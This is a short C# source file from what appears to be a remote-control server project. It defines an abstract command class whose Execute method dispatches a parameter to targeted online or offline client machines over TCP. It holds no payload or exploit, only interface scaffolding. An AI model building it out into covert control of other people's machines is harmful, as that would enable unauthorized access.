using System;
using System.Collections.Generic;

namespace Orcus.Server.Core.DynamicCommands
{
    public abstract class SpecialCommand
    {
        /// <summary>
        ///     The id of the command
        /// </summary>
        public abstract Guid CommandId { get; }

        public abstract ValidClients ValidClients { get; }

        /// <summary>
        ///     Execute the special command
        /// </summary>
        /// <param name="parameter">The parameter for the command</param>
        /// <param name="clients">The clients which should execute the command (only online clients)</param>
        /// <param name="tcpServerInfo">Some useful information</param>
        /// <returns>Return the clients which received the command</returns>
        public abstract List<int> Execute(byte[] parameter, List<TargetedClient> clients, ITcpServerInfo tcpServerInfo);
    }

    public enum ValidClients
    {
        OnlineOnly,
        OfflineOnly,
        OnlineAndOffline
    }
}